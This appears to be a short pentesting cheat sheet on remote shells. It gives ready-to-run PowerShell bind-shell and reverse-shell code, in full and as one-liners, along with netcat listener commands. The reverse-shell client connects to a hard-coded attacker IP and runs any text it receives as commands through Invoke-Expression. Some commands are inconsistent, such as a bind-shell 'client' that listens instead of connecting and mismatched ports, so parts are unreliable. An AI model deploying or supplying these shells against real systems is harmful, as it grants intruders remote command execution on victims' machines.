# Remote Shells

This is much simpler to do with powercat, but bind shells can be created manually as shown below.

### Bind Shell

#### Server (Pretty Version)

```powershell
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{;
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush()
};
$client.Close();
$listener.Stop()
```

#### Server (One-Liner)

```powershell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

#### Client

```bash
sudo nc -lvnp 192.168.216.10 443
```

Pressing 'ENTER' will cause the prompt to show up.

### Reverse Shell

#### Server

```bash
sudo nc -lvnp 443
```

Pressing 'ENTER' will cause the prompt to show up once a connection is made.

#### Client (Pretty version)

```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.119.216',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
# Invoke-Expression (iex) cmdlet, runs any string it receives as a command and redirects results back
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
}
$client.Close();
```

#### Client (One-Liner )

Same as above, but lines are connected together with no space after semi-colon

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.216',8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

